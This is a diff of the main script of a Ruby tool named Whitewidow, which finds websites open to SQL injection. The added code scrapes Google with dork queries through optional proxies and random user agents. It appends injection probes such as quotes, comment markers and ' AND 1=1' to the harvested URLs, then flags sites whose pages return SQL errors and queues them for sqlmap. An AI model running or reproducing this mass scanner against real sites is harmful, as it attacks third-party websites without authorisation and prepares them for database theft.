@@ -1,22 +1,28 @@
 #!/usr/local/env ruby
+
 require_relative 'lib/imports/constants_and_requires'
 
-def banner_message
-  [
-    "Mandatory options  : -[d|f|s] FILE|URL --[default|file|spider] FILE|URL",
-    "Enumeration options: -[x] NUM --[dry-run|batch|run-x] NUM",
-    "Anomity options    : -[p] IP:PORT --[rand-agent|proxy] IP:PORT",
-    "Processing options : -[D] DORK --[sqlmap|dork] DORK",
-    "Misc options       : -[l|b|u] --[legal|banner|beep|update]",
-    " " # Blank line for nice formatting
-  ].join("\n")
+#
+# Usage page, basic help page for commands
+#
+def usage_page
+  FORMAT.info("ruby #{File.basename(__FILE__)} -[SHORT-OPTS] [ARGS] --[LONG-OPTS] [ARGS]")
+  FORMAT.info("Check the README.md file for a list of flags and further information\n")
+  system('ruby whitewidow.rb --help')
+  exit
 end
+
 #
 # Append into the OPTIONS constant so that we can call the flag from the constant instead of a class
 #
-ARGV << '-h' if ARGV.empty? # Display help dialog if no flags are passed
 OptionParser.new do |opt|
-  opt.banner = banner_message
+  opt.banner="Mandatory options  : -[d|f|s] FILE|URL --[default|file|spider] FILE|URL
+Enumeration options: -[x] NUM --[dry-run|batch|run-x] NUM
+Anomity options    : -[p] IP:PORT --[rand-agent|proxy] IP:PORT
+Processing options : -[D] DORK --[sqlmap|dork] DORK
+Misc options       : -[l|b|u] --[legal|banner|beep|update]
+
+" # Blank line has to be there so that the help menu looks good.
   opt.on('-f FILE', '--file FILE', 'Pass a filename to scan for vulnerabilities')         { |o| OPTIONS[:file]    = o }
   opt.on('-s URL', '--spider URL', 'Spider a web page and save all the URLS')             { |o| OPTIONS[:spider]  = o }
   opt.on('-d', '--default', 'Run in default mode, scrape Google')                         { |o| OPTIONS[:default] = o }
@@ -32,12 +38,126 @@ OptionParser.new do |opt|
   opt.on('--beep', 'Make a beep when the program finds a vulnerability')                  { |o| OPTIONS[:beep]    = o }
   opt.on('--rand-agent', 'Use a random user agent')                                       { |o| OPTIONS[:agent]   = o }
   opt.on('--sqlmap', 'Run sqlmap through the SQL_VULN.LOG file as a bulk file')           { |o| OPTIONS[:sqlmap]  = o }
-  opt.on('-h', '--help', 'Display this help dialog') do
-    Whitewidow::Scanner.usage_page
-    puts opt
-  end
 end.parse!
 
+#
+# File formatting
+#
+def format_file
+  FORMAT.info('Writing to temporary file..')
+  if File.exists?(OPTIONS[:file])
+    file = Tempfile.new('file') # Write to a temp file
+    IO.read(OPTIONS[:file]).each_line do |line|
+      File.open(file, 'a+') { |format| format.puts(line) unless line.chomp.empty? } # Skip blank lines and whitespace
+    end
+    IO.read(file).each_line do |to_file|
+      File.open("#{PATH}/tmp/#sites.txt", 'a+') { |line| line.puts(to_file) }
+    end
+    file.unlink
+    FORMAT.info("File: #{OPTIONS[:file]}, has been formatted and saved as #sites.txt in the tmp directory.")
+  else
+    puts <<~_END_
+
+      Hey now my friend, I know you're eager, I am also, but that file #{OPTIONS[:file]}
+      either doesn't exist, or it's not in the directory you say it's in..
+
+      I'm gonna need you to go find that file, move it to the correct directory and then
+      run me again.
+
+      Don't worry I'll wait!
+         _END_
+             .yellow.bold  # Error out because the file doesn't exist
+  end
+end
+
+#
+# Get the URLS by connecting to google and scraping for the URLS on the first page
+#
+def get_urls
+  query = SETTINGS.extract_query!
+  url_arr = Array.new
+
+  File.read("#{QUERY_BLACKLIST_PATH}").each_line do |black|  # check if the search query is black listed
+    if query == black
+      FORMAT.warning("Query: #{query} is blacklisted, defaulting to random query")
+      query = File.readlines("#{PATH}/lib/lists/search_query.txt").sample  # Retry if it is
+    end
+  end
+
+  FORMAT.info("I'm searching for possible SQL vulnerable sites, using search query #{query.chomp}")
+  agent = Mechanize.new
+  if OPTIONS[:proxy]
+    agent.set_proxy(OPTIONS[:proxy].split(":").first, OPTIONS[:proxy].split(":").last)  # Set your proxy if used
+  end
+  correct_agent = SETTINGS.random_agent?
+  agent.user_agent = correct_agent
+  correct_agent == DEFAULT_USER_AGENT ? FORMAT.info("Using default user agent") :
+      FORMAT.info("Grabbed random agent: #{correct_agent}")
+  page = agent.get("http://google.com")
+  google_form = page.form('f')
+  google_form.q = "#{query}"  # Search Google for the query
+  url = agent.submit(google_form, google_form.buttons.first)
+  url.links.each do |link|
+    if link.href.to_s =~ /url.q/  # Pull the links from the search
+      str = link.href.to_s
+      str_list = str.split(%r{=|&})
+      urls = str_list[1]
+      if urls.split("/")[2].start_with?(*SKIP)  # Skip all the bad URLs
+        next
+      end
+      urls_to_log = URI.decode(urls)
+      FORMAT.success("Site found: #{urls_to_log}")
+      sleep(0.3)
+      url_arr.insert(-1, urls_to_log)
+      %w(' -- ; " /* '/* '-- "-- '; "; `).each { |err|
+        File.open("#{SITES_TO_CHECK_PATH}", 'a+') { |error_check| error_check.puts("#{urls_to_log}#{err}") } # Add sql syntax to all "="
+        MULTIPARAMS.check_for_multiple_parameters(urls_to_log, err)
+      }
+      [" AND 1=1"].each { |blind| # Temp working on adding all types of sql injection techniques
+        File.open("#{SITES_TO_CHECK_PATH}", "a+") { |blind_check| blind_check.puts("#{urls_to_log}#{blind}") }
+      }
+    end
+  end
+  FORMAT.info("I've dumped possible vulnerable sites into #{SITES_TO_CHECK_PATH}")
+end
+
+#
+# Check the sites that where found for vulnerabilities by checking if they throw a certain error
+#
+def vulnerability_check
+  OPTIONS[:default] ? file_to_read = SITES_TO_CHECK_PATH : file_to_read = FILE_FLAG_FILE_PATH
+  FORMAT.info('Forcing encoding to UTF-8') unless OPTIONS[:file]
+  IO.read("#{file_to_read}").each_line do |vuln|
+    begin
+      FORMAT.info("Parsing page for SQL syntax error: #{vuln.chomp}")
+      Timeout::timeout(10) do
+        vulns = vuln.encode(Encoding.find('UTF-8'), {invalid: :replace, undef: :replace, replace: ''}) # Force encoding to UTF-8
+        begin
+          if SETTINGS.parse("#{vulns.chomp}'", 'html', 0) =~ SQL_VULN_REGEX  # If it has the vuln regex error
+            FORMAT.site_found(vulns.chomp)
+            File.open("#{TEMP_VULN_LOG}", "a+") { |vulnerable| vulnerable.puts(vulns) }
+            sleep(0.5)
+          else
+            FORMAT.warning("URL: #{vulns.chomp} is not vulnerable, dumped to non_exploitable.txt")
+            File.open("#{NON_EXPLOITABLE_PATH}", "a+") { |non_exploit| non_exploit.puts(vulns) }
+            sleep(0.5)
+          end
+        rescue Timeout::Error, OpenSSL::SSL::SSLError  # Timeout or SSL errors
+          FORMAT.warning("URL: #{vulns.chomp} failed to load dumped to non_exploitable.txt")
+          File.open("#{NON_EXPLOITABLE_PATH}", "a+") { |timeout| timeout.puts(vulns) }
+          sleep(0.5)
+          next
+        end
+      end
+    rescue *LOADING_ERRORS  # site doesn't exist or this is not a valid URL
+      FORMAT.err("URL: #{vuln.chomp} failed due to an error while connecting, URL dumped to non_exploitable.txt")
+      File.open("#{NON_EXPLOITABLE_PATH}", "a+") { |error| error.puts(vuln) }
+      next
+    end
+  end
+end
+
+#
 # This case statement has to be empty or the program won't read the options constants
 begin
   case
@@ -45,7 +165,7 @@ begin
     begin
       SETTINGS.hide_banner?
       SETTINGS.show_legal?
-      Whitewidow::Scanner.get_urls(OPTIONS[:proxy])
+      get_urls
       if File.size("#{SITES_TO_CHECK_PATH}") == 0
         FORMAT.warning("No sites found for search query: #{SEARCH_QUERY}. Adding query to blacklist so it won't be run again.")  # Add the query to the blacklist
         File.open("#{QUERY_BLACKLIST_PATH}", "a+") { |query| query.puts(SEARCH_QUERY) }
@@ -58,10 +178,10 @@ begin
           FORMAT.info('Sites saved to file, will not run scan now..')
           exit(0)
         else
-          Whitewidow::Scanner.vulnerability_check(file_mode: false)
+          vulnerability_check
         end
       else
-        Whitewidow::Scanner.vulnerability_check(file_mode: false)
+        vulnerability_check
       end
       File.open("#{ERROR_LOG_PATH}", 'a+') {
           |s| s.puts("No sites found with search query #{DEFAULT_SEARCH_QUERY}")
@@ -85,8 +205,8 @@ begin
       SETTINGS.hide_banner?
       SETTINGS.show_legal?
       FORMAT.info('Formatting file')
-      Whitewidow::Scanner.format_file(OPTIONS[:file])
-      Whitewidow::Scanner.vulnerability_check(file_mode: true)
+      format_file
+      vulnerability_check
       File.truncate("#{SITES_TO_CHECK_PATH}", 0)
       FORMAT.info("I'm truncating SQL_sites_to_check file back to #{File.size("#{SITES_TO_CHECK_PATH}")}")
       Copy.file("#{TEMP_VULN_LOG}", "#{SQL_VULN_SITES_LOG}")
@@ -133,7 +253,8 @@ begin
     SETTINGS.update!
     FORMAT.info("Successfully upgraded to #{VERSION_STRING}")
   else
-    exit(1)
+    FORMAT.warning('You failed to pass me a flag!')
+    usage_page
   end
 rescue => e
   FORMAT.err("Failed with error code #{e}")
